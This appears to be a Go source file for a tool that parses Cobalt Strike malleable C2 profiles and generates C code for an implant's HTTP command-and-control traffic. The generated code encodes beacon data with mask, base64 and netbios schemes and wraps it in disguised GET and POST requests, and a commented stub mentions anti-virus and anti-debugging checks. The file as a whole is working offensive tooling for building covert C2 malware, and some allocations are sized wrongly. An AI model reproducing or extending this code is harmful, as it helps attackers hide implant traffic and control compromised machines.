package main

import (
	"os"
	"fmt"
	"strings"
	"strconv"
	parser "github.com/D00Movenok/goMalleable"
)

var ua = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1\r\n"

// --------------- GLOBAL
var profile_c_global = `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct raw_data {
	char *data;
	long long size;
} raw_data_t;

typedef unsigned int uint32_t;

raw_data_t *memcat(char *mem1, int mem1_len, char *mem2, int mem2_len) {
	raw_data_t *tempMem = (raw_data_t *)calloc(1, sizeof(raw_data_t));
	tempMem->size = mem1_len + mem2_len;
	tempMem->data = (char *)calloc(1, tempMem->size);

	memcpy(tempMem->data, mem1, mem1_len);
	memcpy(tempMem->data + mem1_len, mem2, mem2_len);
	return tempMem;
}

raw_data_t *find_payload(char *rawData, long long rawData_len, char *start, char *end) {
	if (rawData != NULL) {
		char *s = strstr(rawData, start);
		char *e = strstr(rawData, end);
		if (s && e) {
			rawData = s + strlen(start);
			int payload_len = strlen(rawData) - strlen(e);
            raw_data_t *tempMem = (raw_data_t *)calloc(1, sizeof(raw_data_t));
            tempMem->size = payload_len;
            tempMem->data = (char *)calloc(1, tempMem->size);
            memcpy(tempMem->data, rawData, payload_len);

			return tempMem;
		}
	}
    return NULL;
}


/*
void cc2_init() {
	// maybe check AV, antiDebug, network, or launch other C2
}
*/

/*
void cc2_retryConnect(int count) {
	// do something 
}
*/

void safe_free(raw_data_t **mem) {
    if (*mem) {
        if ((*mem)->data) {
            free((*mem)->data);
            (*mem)->data = NULL;
        }
        (*mem)->size = 0;
        free(*mem);
        *mem = NULL;
    }
}
static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};
void build_decoding_table() {
    decoding_table = malloc(256);
    for (int i = 0; i < 64; i++)
        decoding_table[(unsigned char) encoding_table[i]] = i;
}
void base64_cleanup() {
    free(decoding_table);
}
raw_data_t *base64_en(const unsigned char *data, size_t input_length) {
    raw_data_t *tempMem = (raw_data_t *)calloc(1, sizeof(raw_data_t *));
    
    if (!data || input_length <= 0) {
        tempMem->size = 0;
        tempMem->data = NULL;
        return tempMem;
    }
    
    tempMem->size = 4 * ((input_length + 2) / 3);
    tempMem->data = (char *)calloc(1, tempMem->size);
    char *encoded_data = tempMem->data;
    if (encoded_data == NULL) return NULL;
    for (int i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }
    for (int i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[tempMem->size - 1 - i] = '=';
    return tempMem;
}
raw_data_t *base64_de(const char *data, size_t input_length) {
    if (decoding_table == NULL) build_decoding_table();
    if (input_length % 4 != 0) return NULL;
    raw_data_t *tempMem = (raw_data_t *)calloc(1, sizeof(raw_data_t *));
    size_t output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') output_length--;
    if (data[input_length - 2] == '=') output_length--;
    tempMem->size = output_length;
    tempMem->data = (char *)calloc(1, tempMem->size);
    
    unsigned char *decoded_data = tempMem->data;
    if (decoded_data == NULL) return NULL;
    for (int i = 0, j = 0; i < input_length;) {
        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t triple = (sextet_a << 3 * 6)
        + (sextet_b << 2 * 6)
        + (sextet_c << 1 * 6)
        + (sextet_d << 0 * 6);
        if (j < output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }
    return tempMem;
}


raw_data_t * mask_en(char *mem, int mem_len) {
    raw_data_t *tempMem = (raw_data_t *)calloc(1, sizeof(raw_data_t *));
    tempMem->size = mem_len+4;
    tempMem->data = (char *)calloc(1, tempMem->size);
    char *data = tempMem->data;
    data[0] = (char) (rand() % 255);
    data[1] = (char) (rand() % 255);
    data[2] = (char) (rand() % 255);
    data[3] = (char) (rand() % 255);
    for (int i = 4; i < mem_len+4; ++i) {
        data[i] = mem[i-4] ^ data[i%4];
    }
    return tempMem;
}

raw_data_t *mask_de(char *mem, int mem_len) {
    raw_data_t *tempMem = (raw_data_t *)calloc(1, sizeof(raw_data_t));
        
    if (mem_len > 4) {
        tempMem->size = mem_len-4;
        tempMem->data = (char *)calloc(1, tempMem->size);
        char *data = tempMem->data;
        
        char key[4] = {mem[0], mem[1], mem[2], mem[3]};
        for (int i = 0; i < mem_len-4; ++i) {
            data[i] = mem[i+4] ^ key[i%4];
        }
    } else {
        tempMem->size = 0;
        tempMem->data = NULL;
    }
        
    return tempMem;
}


raw_data_t *base64url_en(char *mem, int mem_len) {
    raw_data_t *b64_data = base64_en(mem, mem_len);
    for (int i = 0; i < b64_data->size; ++i) {
        char ch = b64_data->data[i];
        if (ch == '/') {
            b64_data->data[i] = '_';
        } else if (ch == '+') {
            b64_data->data[i] = '-';
        }
    }
    return b64_data;
}

raw_data_t *base64url_de(char *mem, int mem_len) {
    int append_len = mem_len % 4;
    if (append_len)
        append_len = 4 - append_len;
    char *fix_mem = (char *)malloc(mem_len+append_len);
    for (int i = 0; i < mem_len; ++i) {
        char ch = mem[i];
        if (ch == '_') {
            fix_mem[i] = '/';
        } else if (ch == '-') {
            fix_mem[i] = '+';
        } else {
            fix_mem[i] = mem[i];
        }
    }

    int t_append_len = append_len;
    while (t_append_len > 0) {
        fix_mem[mem_len+(t_append_len-1)] = '=';
        t_append_len--;
    }
    raw_data_t *b64_dedata = base64_de(fix_mem, mem_len+append_len);
    free(fix_mem);
    fix_mem = NULL;
    return b64_dedata;
}


raw_data_t *netbiosE(char paramChar, char *mem, int mem_len) {
    raw_data_t *tempMem = (raw_data_t *)calloc(1, sizeof(raw_data_t *));
    tempMem->size = mem_len*2;
    tempMem->data = (char *)calloc(1, tempMem->size);
    char *p = tempMem->data;
    for (int i = 0; i < mem_len; ++i) {
        int a = (mem[i] & 0xf0) >> 4;
        int b = (mem[i] & 0xf);
        a += paramChar;
        b += paramChar;
        *p++ = a;
        *p++ = b;
    }
    return tempMem;
}

raw_data_t *netbiosD(char paramChar, char *mem, int mem_len) {
    raw_data_t *tempMem = (raw_data_t *)calloc(1, sizeof(raw_data_t *));
    tempMem->size = mem_len/2;
    tempMem->data = (char *)calloc(1, tempMem->size);
    char *p = tempMem->data;
    
    for (int i = 0; i < mem_len; i+=2) {
        int a = mem[i];
        int b = mem[i+1];
        int c = (a - paramChar<<4);
        c = (c + (b - paramChar));
        *p++ = c;
    }
    return tempMem;
}


raw_data_t *netbios_en(char *mem, int mem_len) {
    return netbiosE('a', mem, mem_len);
}

raw_data_t *netbiosu_en(char *mem, int mem_len) {
    return netbiosE('A', mem, mem_len);
}

raw_data_t *netbios_de(char *mem, int mem_len) {
    return netbiosD('a', mem, mem_len);
}

raw_data_t *netbiosu_de(char *mem, int mem_len) {
    return netbiosD('A', mem, mem_len);
}
`

func profile_c_code_tp(data_name, encode_type, tp_type, last_varname string, encode_count int) (string, string, string){
	encode_name := encode_type+"_"+tp_type
	new_varname := data_name+"_" +encode_name+strconv.Itoa(encode_count)
	encode_code := "raw_data_t *"+new_varname+" = "+encode_name+"("+last_varname+"->data, "+last_varname+"->size);\n"
	last_varname = new_varname
	free_code := "safe_free(&"+last_varname+");\n"
	return encode_code, free_code, last_varname
}

func profile_c_decode(data_name, encode_type, last_varname string, encode_count int) (string, string, string){
	return profile_c_code_tp(data_name, encode_type, "de", last_varname, encode_count)
}

func profile_c_encode(data_name, encode_type, last_varname string, encode_count int) (string, string, string){
	return profile_c_code_tp(data_name, encode_type, "en", last_varname, encode_count)
}

func fmt_go_2_c(var_name, data string) string {
	data_len := len(data)
	code := "char c_"+var_name+"["+strconv.Itoa(data_len+1)+"] = {"
	for i := 0; i < data_len; i++ {
		ch := data[i]
		code += fmt.Sprintf("0x%X, ", ch)
		if (i == data_len-1) {
			code += "0x0"
		}
	}
	code = code[:]
	code += "};\n"
	return code
}

func fmt_profile_endata(endata_name string, metadata []parser.MultiParam) (string, string, string) {
	// 最终返回 encode相关 c-code 和 数据存放地方
	c_encode := ""
	c_free := ""

	data_storetype := ""

	prepend_data := ""
	append_data := ""

	encode_count := 0
	last_varname := "raw_data_" + endata_name
	last_encode_type := ""
	for _, i := range metadata {
		if (i.Verb == "mask" || i.Verb == "base64" || i.Verb == "base64url" || i.Verb == "netbios" || i.Verb == "netbiosu") {
			encode_count += 1
			en_code, free_code, last_var := profile_c_encode(endata_name, i.Verb, last_varname, encode_count)
			c_encode += en_code
			c_free += free_code
			last_varname = last_var
			last_encode_type = i.Verb
		} else if (i.Verb == "prepend") {
			prepend_data = i.Values[0] + prepend_data
		} else if (i.Verb == "append") {
			append_data += i.Values[0]

			// metadata 储存位置
		} else if (i.Verb == "header") {
			data_storetype = i.Values[0]
		} else if (i.Verb == "parameter") {
			data_storetype = "?"+i.Values[0]
		} else if (i.Verb == "uri-append") {
			data_storetype = "+"
		}
	}
	if (encode_count == 1 && last_encode_type == "base64") {
		// fmt.Println("skip encode....")
		c_encode = ""
		c_free = ""
		c_encode = "raw_data_t "+endata_name+"_t = {"+endata_name+", 0};\n"
		c_encode += endata_name+"_t.size = strlen("+endata_name+");\n"
		c_encode += "raw_data_t *"+endata_name+"_p = &"+endata_name+"_t;\n"
		last_varname = endata_name+"_p"
	} else {
		c_encode = "raw_data_t *raw_data_"+endata_name+" = base64_de("+endata_name+", strlen("+endata_name+"));\n" + c_encode
		c_free = "safe_free(&raw_data_"+endata_name+");\n" + c_free
	}

	if (prepend_data != "") {
		c_encode += fmt_go_2_c("pre_data_"+endata_name, prepend_data)
		c_encode += "raw_data_t *prepend_data_"+endata_name+" = memcat(c_pre_data_"+endata_name+", "+strconv.Itoa(len(prepend_data))+", "+last_varname+"->data, "+last_varname+"->size);\n"
		c_free += "safe_free(&prepend_data_"+endata_name+");\n"
		last_varname = "prepend_data_"+endata_name
	}
	if (append_data != "") {
		c_encode += fmt_go_2_c("add_data_"+endata_name, append_data)
		c_encode += "raw_data_t *append_data_"+endata_name+" = memcat("+last_varname+"->data, "+last_varname+"->size, c_add_data_"+endata_name+", "+strconv.Itoa(len(append_data))+");\n"
		c_free += "safe_free(&append_data_"+endata_name+");\n"
		last_varname = "append_data_"+endata_name
	}
	c_encode += "raw_data_t *en_out_"+endata_name+" = "+last_varname+";\n\n"  
	c_encode = "// encode "+endata_name+" data\n" + c_encode

	return c_encode, c_free, data_storetype
}

func get_match_string(mini_match_length int, subdata string, profiledata string, is_predata bool) string{
	match_str := ""
	for {
		if (is_predata) {
			match_str = subdata[len(subdata)-mini_match_length:]
		} else {
			match_str = subdata[0:mini_match_length]
		}
		if strings.Count(profiledata, match_str) == 1 {
			break
		} else {
			mini_match_length += 1
		}
	}
	return match_str
}

func fmt_profile_dedata(dedata_name string, metadata []parser.MultiParam) (string, string, string) {
	c_encode := ""
	c_free := ""

	data_storetype := ""

	prepend_data := ""
	append_data := ""

	encode_count := 0
	last_varname := "raw_data"
	last_encode_type := ""

	for index := len(metadata)-1; index >= 0; index-- {
		i := metadata[index]
		// 加密编码方式
		if (i.Verb == "mask" || i.Verb == "base64" || i.Verb == "base64url" || i.Verb == "netbios" || i.Verb == "netbiosu") {
			encode_count += 1
			en_code, free_code, last_var := profile_c_decode("reqData", i.Verb, last_varname, encode_count)
			c_encode += en_code
			c_free += free_code
			last_varname = last_var
			last_encode_type = i.Verb
		} else if (i.Verb == "prepend") {
			prepend_data = prepend_data + i.Values[0]
		} else if (i.Verb == "append") {
			append_data = i.Values[0] + append_data

			// metadata 储存位置
		} else if (i.Verb == "header") {
			data_storetype = i.Values[0]
		} else if (i.Verb == "parameter") {
			data_storetype = "?"+i.Values[0]
		} else if (i.Verb == "uri-append") {
			data_storetype = "+"
		}
	}
	if (encode_count == 1 && last_encode_type == "base64") {
		c_encode = ""
		c_free = ""
		last_varname = "raw_data"
	}
	c_payload := ""
	profile_data := ""
	if (prepend_data != "") {
		profile_data = prepend_data
		prepend_data = get_match_string(6, prepend_data, profile_data, true)
		c_payload += fmt_go_2_c("pre_data", prepend_data)
	} else {
		// fmt.Println("[error]: c2profile -> http-get{ Server { Output { prepend: not found } } }")
	}
	if (append_data != "") {
		profile_data += append_data
		append_data = get_match_string(6, append_data, profile_data, false)
		c_payload += fmt_go_2_c("add_data", append_data)
	}  else {
		// fmt.Println("[error]: c2profile -> http-get{ Server { Output { prepend: not found } } }")
	}

	c_payload += "raw_data_t *raw_data = find_payload(rawData, rawData_len, c_pre_data, c_add_data);\n\n"

	c_encode = c_payload + c_encode
	if (last_varname == "raw_data") {
		c_encode += "\nraw_data_t *en_out = raw_data;\n"  
	} else {
		c_encode += "\nraw_data_t *en_out = base64_en("+last_varname+"->data, "+last_varname+"->size);\n"  
		c_free += "safe_free(&raw_data);\n"
	}
	
	return c_encode, c_free, data_storetype
}

func fmt_profile_get_client(http_get *parser.HttpGet) string{
	http_header := ""
	http_close := "Close"

	// 获取 URI
	uri := http_get.Params["uri"]
	host := ""
	// 获取 headers
	for _, i := range http_get.Client.Headers {
		if (i[0] == "Connection") {
			http_close = i[1]
			continue
		} else if (i[0] == "Host") {
			host = i[1]
			continue
		} else if (i[0] == "useragent") {
			// User-Agent
			ua = i[1]
			continue
		}
		http_header += i[0]+": "+i[1] + "\r\n"
	}
	http_body := "Host: " + host + "\r\n"
	http_body += "User-Agent: " + ua
	http_body += http_header

	// 获取 metadata 编码方式
	c_code, c_free, data_storetype := fmt_profile_endata("reqData", http_get.Client.Metadata)

	// 处理 metadata 到HTTP包存放位置
	new_uri := ""
	header_flag := false
	switch data_storetype[0] {
	case '?':
		// 数据为在 URL上，使用URI传参上传递
		// { GET /url_aaaaa? } + en_out + { HTTP/1.1\r\n } + {header}
		if (strings.Contains(uri, "?")) {
			new_uri = uri + "&"+data_storetype[1:]+"="
		} else {
			new_uri = uri + data_storetype+"="
		}
		fallthrough
	case '+':
		// 数据为URL，但是直接拼接在后面的
		// { GET /url_aaaaa} + en_out + { HTTP/1.1\r\n } + {header}
		if (data_storetype[0] == '+') {
			new_uri = uri
		}
		http_url_line := "GET " + new_uri
		http_url_line_c := fmt_go_2_c("http_url_line", http_url_line)
		c_code += http_url_line_c
		c_code += "raw_data_t *http_1 = memcat(c_http_url_line, "+strconv.Itoa(len(http_url_line))+ ", en_out_reqData->data, en_out_reqData->size);\n"
		c_free += "safe_free(&http_1);\n"

		http_header := " HTTP/1.1\r\n" + http_body
		http_header_c := fmt_go_2_c("http_header", http_header)
		c_code += http_header_c
		c_code += "raw_data_t *http_header = memcat(http_1->data, http_1->size, c_http_header, "+strconv.Itoa(len(http_header))+");\n" 
		c_free += "safe_free(&http_header);\n"
	default:
		// 数据在Header上
		// { GET /url_aaaaa} + { HTTP/1.1\r\n } + {header_sub1} + en_out + {header_close}
		header_flag = true
		http_header := "GET " + uri + " HTTP/1.1\r\n"  + http_body + data_storetype + ": "
		http_header_c := fmt_go_2_c("http_header", http_header)
		c_code += http_header_c
		c_code += "raw_data_t *http_header = memcat(c_http_header, "+strconv.Itoa(len(http_header))+ ", en_out_reqData->data, en_out_reqData->size);\n"
		c_free += "safe_free(&http_header);\n"
	}

	// 处理最后的Connection
	if (header_flag == true) {
		http_close = "\r\nConnection: "+http_close+"\r\n\r\n"
	} else {
		http_close = "Connection: "+http_close+"\r\n\r\n"
	}
	http_close_c := fmt_go_2_c("http_close", http_close)
	c_code += http_close_c
	c_code += "raw_data_t *http_body = memcat(http_header->data, http_header->size, c_http_close, "+strconv.Itoa(len(http_close))+");\n"

	// GET 请求暂时忽略请求体中包含数据
	// // 首先处理下 http头 中的 Content-Length
	// c_content_length := "char content_length[50];\n"
	// if (header_flag == true) {
	// 	c_content_length += "sprintf(content_length, \"\\r\\nContent-Length: %d\\r\\n\\r\\n\", en_out_reqData->size);\n"
	// } else {
	// 	c_content_length += "sprintf(content_length, \"Content-Length: %d\\r\\n\\r\\n\", en_out_reqData->size);\n"
	// }
	// c_code += c_content_length
	// c_code += "raw_data_t *http_headers = memcat(http_header->data, http_header->size, content_length, strlen(content_length));\n"
	// c_free += "safe_free(&http_headers);\n"

	// 处理最后的返回值
	c_code += "\n"+c_free
	c_code += "\n"
	c_code += "*outputData_len = http_body->size;\n"
	c_code += "*outputData = http_body->data;\n"

	fmt_c_code := ""
	for _, i := range strings.Split(c_code, "\n") {
		fmt_c_code += fmt.Sprintf("\t%s\n", i)
	}
	fmt_c_code = "void cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {\n" + fmt_c_code + "}\n"

	return fmt_c_code
}

func fmt_profile_get_server(http_get *parser.HttpGet) string{
	// 获取 ouput 
	c_code, c_free, _ := fmt_profile_dedata("recv_data", http_get.Server.Output)

	c_code += "\n"+c_free
	c_code += "\n"
	c_code += "*outputData_len = en_out->size;\n"
	c_code += "*outputData = en_out->data;\n"

	fmt_c_code := ""
	for _, i := range strings.Split(c_code, "\n") {
		fmt_c_code += fmt.Sprintf("\t%s\n", i)
	}

	fmt_c_code = "void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {\n" + fmt_c_code + "}\n"

	return fmt_c_code
}

func fmt_profile_post_client(http_post *parser.HttpPost) string{
	http_header := ""
	http_close := "Close"

	// 获取 URI
	uri := http_post.Params["uri"]
	host := ""
	// 获取 headers
	for _, i := range http_post.Client.Headers {
		if (i[0] == "Connection") {
			http_close = i[1]
			continue
		} else if (i[0] == "Host") {
			host = i[1]
			continue
		} else if (i[0] == "useragent") {
			// User-Agent
			ua = i[1]
			continue
		}
		http_header += i[0]+": "+i[1] + "\r\n"
	}
	http_body := "Host: " + host + "\r\n"
	http_body += "User-Agent: " + ua
	http_body += http_header
	http_body += "Connection: "+http_close+"\r\n"

	// 获取ID
	c_id_code, c_id_free, id_data_storetype := fmt_profile_endata("id", http_post.Client.ID)
	// 获取output
	c_output_code, c_output_free, _ := fmt_profile_endata("reqData", http_post.Client.Output)

	c_code := c_id_code + c_output_code
	c_free := c_id_free + c_output_free

	// 处理ID放到HTTP包中
	new_uri := ""
	header_flag := false
	switch id_data_storetype[0] {
	case '?':
		// 数据为在 URL上，使用URI传参上传递
		// { GET /url_aaaaa? } + en_id + { HTTP/1.1\r\n } + {header}
		if (strings.Contains(uri, "?")) {
			new_uri = uri + "&"+id_data_storetype[1:]+"="
		} else {
			new_uri = uri + id_data_storetype+"="
		}
		fallthrough
	case '+':
		// 数据为URL，但是直接拼接在后面的
		// { GET /url_aaaaa} + en_id + { HTTP/1.1\r\n } + {header}
		if (id_data_storetype[0] == '+') {
			new_uri = uri
		}
		http_url_line := "POST " + new_uri
		http_url_line_c := fmt_go_2_c("http_url_line", http_url_line)
		c_code += http_url_line_c
		c_code += "raw_data_t *http_1 = memcat(c_http_url_line, "+strconv.Itoa(len(http_url_line))+ ", en_out_id->data, en_out_id->size);\n"
		c_free += "safe_free(&http_1);\n"

		http_header := " HTTP/1.1\r\n" + http_body
		http_header_c := fmt_go_2_c("http_header", http_header)
		c_code += http_header_c
		c_code += "raw_data_t *http_header = memcat(http_1->data, http_1->size, c_http_header, "+strconv.Itoa(len(http_header))+");\n" 
		c_free += "safe_free(&http_header);\n"
	default:
		// 数据在Header上
		// { GET /url_aaaaa} + { HTTP/1.1\r\n } + {header_sub1} + en_out + {header_close}
		header_flag = true
		http_header := "POST " + uri + " HTTP/1.1\r\n"  + http_body + id_data_storetype + ": "
		http_header_c := fmt_go_2_c("http_header", http_header)
		c_code += http_header_c
		c_code += "raw_data_t *http_header = memcat(c_http_header, "+strconv.Itoa(len(http_header))+ ", en_out_id->data, en_out_id->size);\n"
		c_free += "safe_free(&http_header);\n"
	}

	// 首先处理下 http头 中的 Content-Length
	c_content_length := "char content_length[50];\n"
	if (header_flag == true) {
		c_content_length += "sprintf(content_length, \"\\r\\nContent-Length: %d\\r\\n\\r\\n\", en_out_reqData->size);\n"
	} else {
		c_content_length += "sprintf(content_length, \"Content-Length: %d\\r\\n\\r\\n\", en_out_reqData->size);\n"
	}
	c_code += c_content_length
	c_code += "raw_data_t *http_headers = memcat(http_header->data, http_header->size, content_length, strlen(content_length));\n"
	c_free += "safe_free(&http_headers);\n"

	// 处理 body
	c_code += "raw_data_t *http_body = memcat(http_headers->data, http_headers->size, en_out_reqData->data, en_out_reqData->size);\n"

	// 处理最后的返回值
	c_code += c_free
	c_code += "\n"
	c_code += "*outputData_len = http_body->size;\n"
	c_code += "*outputData = http_body->data;\n"

	fmt_c_code := ""
	for _, i := range strings.Split(c_code, "\n") {
		fmt_c_code += fmt.Sprintf("\t%s\n", i)
	}
	fmt_c_code = "void cc2_rebind_http_post_send(char *reqData, char *id, char **outputData, long long *outputData_len) {\n" + fmt_c_code + "}\n"
	return fmt_c_code
}

func main() {
	// https://trial.cobaltstrike.com/help-malleable-c2

	if len(os.Args) < 2 {
		fmt.Println("[Usage]: autoRebind <profile> [section]\n\tautoRebind jquery.profile\n\tautoRebind jquery.profile default\n\tautoRebind jquery.profile unix-section\n")
		os.Exit(1)
	}
	profile_section := ""
	if len(os.Args) == 3 {
		profile_section = os.Args[2] // 选择需要使用哪个profile中的配置
	} else {
		profile_section = "default"
	}

	data, _ := os.ReadFile(os.Args[1])
	parsed, _ := parser.Parse(string(data))

	c_get_client := fmt_profile_get_client(parsed.HttpGet[profile_section])
	c_get_server := fmt_profile_get_server(parsed.HttpGet[profile_section])
	c_post_client := fmt_profile_post_client(parsed.HttpPost[profile_section])
	c_post_server := strings.Replace(c_get_server, "cc2_rebind_http_get_recv", "cc2_rebind_http_post_recv", -1)

	profile_c_global += c_get_client+c_get_server+c_post_client+c_post_server
	fmt.Println(profile_c_global)
}
